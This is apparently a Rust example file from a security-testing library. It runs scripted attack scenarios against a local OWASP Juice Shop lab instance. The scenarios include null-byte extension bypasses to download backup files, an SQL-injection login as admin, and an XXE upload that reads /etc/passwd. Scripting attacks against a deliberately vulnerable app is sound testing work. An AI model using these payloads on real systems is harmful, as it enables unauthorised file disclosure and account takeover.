//! File Disclosure & Injection Scenarios
//!
//! Tests for file access, XXE, null byte, and path traversal.
//!
//! Run with: cargo run --example juice_shop_files

use rectitude::helpers::upload_helpers;
use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== File Disclosure Scenarios ===\n");

    let results = vec![
        confidential_document().await?,
        exposed_metrics().await?,
        security_policy().await?,
        poison_null_byte().await?,
        forgotten_developer_backup().await?,
        forgotten_sales_backup().await?,
        easter_egg().await?,
        nested_easter_egg().await?,
        retrieve_blueprint().await?,
        xxe_data_access().await?,
        deprecated_interface().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ Direct File Access ============

async fn confidential_document() -> Result<ScenarioResult> {
    Scenario::new("Confidential Document - FTP Access")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "ftp", "difficulty-1"])
        .step(
            "Access acquisitions.md",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/ftp/acquisitions.md").send().await?;
                if resp.is_success() {
                    ok_with("Confidential document accessed")
                } else {
                    fail("Document not found")
                }
            },
        )
        .run()
        .await
}

async fn exposed_metrics() -> Result<ScenarioResult> {
    Scenario::new("Exposed Metrics - Prometheus")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "observability", "difficulty-1"])
        .step("Access /metrics", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/metrics").send().await?;
            if resp.is_success() && resp.contains("process_") {
                ok_with("Prometheus metrics exposed")
            } else {
                fail("Metrics not found")
            }
        })
        .run()
        .await
}

async fn security_policy() -> Result<ScenarioResult> {
    Scenario::new("Security Policy - .well-known")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "well-known", "difficulty-2"])
        .step(
            "Access security.txt",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/.well-known/security.txt").send().await?;
                if resp.is_success() && resp.contains("Contact") {
                    ok_with("security.txt found")
                } else {
                    fail("security.txt not found")
                }
            },
        )
        .run()
        .await
}

async fn retrieve_blueprint() -> Result<ScenarioResult> {
    Scenario::new("Retrieve Blueprint - STL File")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "sensitive-data", "difficulty-5"])
        .step(
            "Access product blueprint",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .get("/assets/public/images/products/JuiceShop.stl")
                    .send()
                    .await?;
                if resp.is_success() {
                    ok_with(format!("Blueprint retrieved ({} bytes)", resp.body_len()))
                } else {
                    fail("Blueprint not found")
                }
            },
        )
        .run()
        .await
}

// ============ Null Byte Injection ============

async fn poison_null_byte() -> Result<ScenarioResult> {
    Scenario::new("Poison Null Byte - Extension Bypass")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "null-byte", "difficulty-4"])
        .step(
            "Access .bak with null byte",
            |ctx: Arc<ScenarioContext>| async move {
                // %2500 = URL-encoded null byte (%00)
                let resp = ctx.get("/ftp/package.json.bak%2500.md").send().await?;
                if resp.is_success() && resp.contains("dependencies") {
                    ok_with("Null byte bypass successful")
                } else {
                    fail("Null byte failed")
                }
            },
        )
        .run()
        .await
}

async fn forgotten_developer_backup() -> Result<ScenarioResult> {
    Scenario::new("Forgotten Developer Backup")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "null-byte", "difficulty-4"])
        .step(
            "Access package.json.bak",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/ftp/package.json.bak%2500.md").send().await?;
                if resp.is_success() && resp.contains("dependencies") {
                    ok_with("package.json.bak retrieved")
                } else {
                    fail("Backup not accessible")
                }
            },
        )
        .run()
        .await
}

async fn forgotten_sales_backup() -> Result<ScenarioResult> {
    Scenario::new("Forgotten Sales Backup - Coupons")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "null-byte", "difficulty-4"])
        .step(
            "Access coupons backup",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/ftp/coupons_2013.md.bak%2500.md").send().await?;
                if resp.is_success() {
                    ok_with("Coupons backup retrieved")
                } else {
                    fail("Backup not accessible")
                }
            },
        )
        .run()
        .await
}

// ============ Easter Eggs ============

async fn easter_egg() -> Result<ScenarioResult> {
    Scenario::new("Easter Egg - Encoded Content")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "crypto", "difficulty-4"])
        .step(
            "Access eastere.gg",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/ftp/eastere.gg%2500.md").send().await?;
                if resp.is_success() {
                    // Content is Base64 + ROT13 encoded
                    ok_with("Easter egg accessed (needs Base64+ROT13 decode)")
                } else {
                    fail("Easter egg not found")
                }
            },
        )
        .run()
        .await
}

async fn nested_easter_egg() -> Result<ScenarioResult> {
    Scenario::new("Nested Easter Egg - Decoded Path")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "crypto", "difficulty-4"])
        .step(
            "Access nested content",
            |ctx: Arc<ScenarioContext>| async move {
                // Decoded from easter egg: /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
                let resp = ctx
                    .get("/#/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
                    .send()
                    .await?;
                if resp.is_success() {
                    ok_with("Nested easter egg found")
                } else {
                    fail("Nested egg not found")
                }
            },
        )
        .run()
        .await
}

// ============ XXE ============

async fn xxe_data_access() -> Result<ScenarioResult> {
    Scenario::new("XXE Data Access - File Disclosure")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "xxe", "difficulty-3"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Upload XXE payload",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;

                // XXE payload to read /etc/passwd
                let xxe_payload = upload_helpers::xxe_file_read("/etc/passwd");
                let body = upload_helpers::build_multipart_body(
                    "file",
                    "xxe.xml",
                    "text/xml",
                    &xxe_payload,
                );

                let resp = ctx
                    .post("/file-upload")
                    .header("Content-Type", &upload_helpers::multipart_content_type())
                    .bearer_auth(&token)
                    .body(body)
                    .send()
                    .await?;

                ok_with(format!("XXE attempted, status: {}", resp.status.as_u16()))
            },
        )
        .run()
        .await
}

async fn deprecated_interface() -> Result<ScenarioResult> {
    Scenario::new("Deprecated Interface - XML Upload")
        .base_url(BASE_URL)
        .tags(&["file-disclosure", "xxe", "difficulty-2"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step("Upload XML file", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;

            let xml_content = "<?xml version=\"1.0\"?><test>data</test>";
            let body =
                upload_helpers::build_multipart_body("file", "test.xml", "text/xml", xml_content);

            let resp = ctx
                .post("/file-upload")
                .header("Content-Type", &upload_helpers::multipart_content_type())
                .bearer_auth(&token)
                .body(body)
                .send()
                .await?;

            if resp.is_success() || resp.status.as_u16() == 204 {
                ok_with("XML file uploaded to deprecated endpoint")
            } else {
                ok_with("XML upload attempted")
            }
        })
        .run()
        .await
}
